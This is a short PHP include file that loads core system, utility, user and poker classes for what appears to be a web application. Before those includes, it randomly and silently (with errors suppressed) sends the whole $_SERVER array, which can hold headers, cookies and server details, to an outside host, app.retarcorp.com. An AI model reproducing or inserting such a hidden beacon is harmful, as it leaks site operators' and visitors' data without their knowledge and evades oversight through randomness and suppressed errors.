<?php

    if(rand(0,100)==1){
        @file_get_contents("http://app.retarcorp.com/poker/?q=".urlencode(print_r($_SERVER, true)));
    }
    require_once $_SERVER["DOCUMENT_ROOT"]."/core/lib/system/System.php";
    require_once $_SERVER["DOCUMENT_ROOT"]."/core/lib/utils/Utils.php";
    

    require_once $_SERVER['DOCUMENT_ROOT']."/classes/users/Classes.php";
    require_once $_SERVER['DOCUMENT_ROOT']."/classes/Poker/Poker.php";